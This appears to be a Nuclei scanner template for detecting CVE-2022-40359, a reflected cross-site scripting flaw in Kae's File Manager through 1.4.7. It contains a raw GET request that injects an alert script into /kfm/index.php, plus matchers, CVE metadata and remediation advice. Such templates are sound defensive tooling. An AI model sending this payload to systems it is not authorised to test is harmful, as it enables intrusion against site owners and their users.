http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain);</script>
    - x_kfm_changeCaption
    - kfm_copyFiles
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /kfm/index.php/''<script>alert(document.domain);</script> HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-40359
info:
  author: edoardottt,daffainfo
  classification:
    cpe: cpe:2.3:a:kfm_project:kfm:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-40359
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.93636
    epss-score: 0.12355
  description: 'Kae''s File Manager through 1.4.7 contains a cross-site scripting
    vulnerability via a crafted GET request to /kfm/index.php. An attacker can inject
    arbitrary script in the browser of an unsuspecting user in the context of the
    affected site. This can allow the attacker to steal cookie-based authentication
    credentials and launch other attacks

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute malicious scripts in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: kfm
    vendor: kfm_project
    verified: true
  name: Kae's File Manager <=1.4.7 - Cross-Site Scripting
  reference:
  - https://cxsecurity.com/issue/WLB-2022090057
  - https://code.google.com/archive/p/kfm/downloads
  - https://nvd.nist.gov/vuln/detail/CVE-2022-40359
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to the latest version of Kae''s File Manager plugin (1.4.7)
    or apply the vendor-provided patch to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,kfm,kfm_project,vuln
